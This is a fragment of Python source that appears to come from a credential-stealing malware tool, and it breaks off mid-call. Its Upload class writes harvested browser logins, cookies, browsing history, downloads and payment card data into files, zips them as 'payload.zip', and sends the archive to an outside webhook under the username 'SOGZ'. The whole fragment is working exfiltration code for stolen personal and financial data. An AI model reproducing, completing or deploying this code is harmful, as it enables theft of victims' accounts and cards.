...
class Upload:
    ...
    def write_files(self):
        ...
        if __LOGINS__:
            with open("payload\\logins.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __LOGINS__))

        if __COOKIES__:
            with open("payload\\cookies.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __COOKIES__))

        if __WEB_HISTORY__:
            with open("payload\\web_history.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __WEB_HISTORY__))

        if __DOWNLOADS__:
            with open("payload\\downloads.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __DOWNLOADS__))

        if __CARDS__:
            with open("payload\\cards.txt", "w", encoding="utf-8") as f:
                f.write('\n'.join(str(x) for x in __CARDS__))

        with ZipFile("payload.zip", "w") as zip:
            for file in os.listdir("payload"):
                zip.write(f"payload\\{file}", file)
    ...
    def send(self):
        self.webhook.send(
            embed=Embed(
                title="Payload",
                description="```" +
                '\n'.join(self.tree(Path("payload"))) + "```",
            ),
            file=File("payload.zip"),
            username="SOGZ",
